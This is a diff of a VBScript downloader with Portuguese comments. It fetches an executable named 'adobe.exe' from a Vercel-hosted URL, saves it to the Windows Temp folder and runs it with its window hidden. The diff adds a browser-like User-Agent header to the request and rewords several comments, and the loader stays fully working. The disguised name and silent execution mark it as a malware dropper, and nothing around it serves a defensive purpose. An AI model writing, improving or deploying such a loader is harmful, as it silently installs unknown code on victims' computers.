@@ -2,23 +2,25 @@ Option Explicit
 
 Dim url, caminhoDestino, http, stream, fso
 
-' URL RAW do GitHub para o executável
+' URL hospedada no Vercel
 url = "https://testando123-blond.vercel.app/adobe.exe"
 
 ' Caminho de destino no Temp
 Set fso = CreateObject("Scripting.FileSystemObject")
 caminhoDestino = fso.GetSpecialFolder(2) & "\adobe.exe"
 
-' Apaga se já existir (evita erro ao gravar)
+' Apaga se já existir
 If fso.FileExists(caminhoDestino) Then
     On Error Resume Next
     fso.DeleteFile caminhoDestino, True
     On Error GoTo 0
 End If
 
-' Requisição HTTP
+' Cria a requisição HTTP com cabeçalhos
 Set http = CreateObject("MSXML2.XMLHTTP")
 http.Open "GET", url, False
+http.setRequestHeader "User-Agent", "Mozilla/5.0"
+http.setRequestHeader "Accept", "*/*"
 http.Send
 
 If http.Status = 200 Then
@@ -27,7 +29,6 @@ If http.Status = 200 Then
     stream.Open
     stream.Write http.responseBody
 
-    ' Tenta salvar no destino
     On Error Resume Next
     stream.SaveToFile caminhoDestino, 2
     If Err.Number <> 0 Then
@@ -37,7 +38,7 @@ If http.Status = 200 Then
     On Error GoTo 0
     stream.Close
 
-    ' Executa
+    ' Executar
     CreateObject("WScript.Shell").Run Chr(34) & caminhoDestino & Chr(34), 0, False
 Else
     MsgBox "Erro ao baixar: " & http.Status
